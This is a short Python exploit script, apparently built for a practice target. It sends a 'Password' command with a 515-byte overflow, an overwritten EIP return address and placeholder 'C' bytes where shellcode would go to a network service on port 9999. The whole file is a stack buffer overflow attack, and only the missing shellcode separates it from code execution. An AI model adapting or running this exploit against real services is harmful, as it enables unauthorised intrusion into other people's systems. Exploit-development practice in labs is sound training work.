import socket,sys

address = sys.argv[1]
port=9999

#we have brekpoint 600
#value = input("Enter the buffer Value : ")

buffer= 'A'* 515
eip = '\xf3\x12\x17\x31'
shellcode= 'C' * 350

try:
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	s.connect((address,port))
 	s.send('Password ' + buffer + eip + shellcode + '\r\n')
except:
	print("Program crashed Check your debugger")
s.close()
